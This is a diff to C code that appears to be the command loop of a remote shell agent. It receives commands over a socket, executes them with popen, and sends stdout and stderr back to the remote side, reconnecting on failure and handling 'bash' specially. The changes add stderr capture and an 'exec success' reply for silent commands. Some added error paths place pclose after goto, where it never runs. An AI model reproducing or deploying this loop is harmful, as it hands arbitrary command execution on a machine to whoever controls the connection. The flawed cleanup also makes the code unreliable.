@@ -299,7 +299,9 @@ reconnect:
 		 * CMDLEN, so ret always complete */
 		ret = Recv(fd, cmd, CMDLEN, 0);
 		if(ret <= 0) goto reconnect;
+		sys_debug("recv command: %s\n", cmd);
 
+		strncat(cmd, " 2>&1", CMDLEN - strlen(cmd));
 		if(!strcmp(cmd, "bash")) {
 			sys_debug("Exec: %s\n", cmd);
 			/* parent process will block 
@@ -311,15 +313,30 @@ reconnect:
 		FILE *fp; int size;
 		fp = popen(cmd, "r"); 
 		if(!fp) {
-			sprintf(buf, "Exec failed: %s\n", cmd);
+			sprintf(buf, "exec fail: %s\n", cmd);
 			ret = Send(fd, buf, strlen(buf) + 1, 0);
 			if(ret < 0) goto reconnect;
 		} else {
+			int isfirst = 1;
 			do {
 				size = fread(buf, 1, CMDLEN, fp);
+				/* some command have no output */
+				if(isfirst && size == 0) {
+					sprintf(buf, "exec success: %s\n", cmd);
+					ret = Send(fd, buf, strlen(buf) + 1, 0);
+					if(ret < 0) {
+						goto reconnect;
+						pclose(fp);
+					}
+				}
+
+				isfirst = 0;
 				if(size > 0) {
 					ret = Send(fd, buf, size, 0);
-					if(ret < 0) goto reconnect;
+					if(ret < 0) {
+						goto reconnect;
+						pclose(fp);
+					}
 				}
 			} while(size == BUFLEN);
 			pclose(fp);
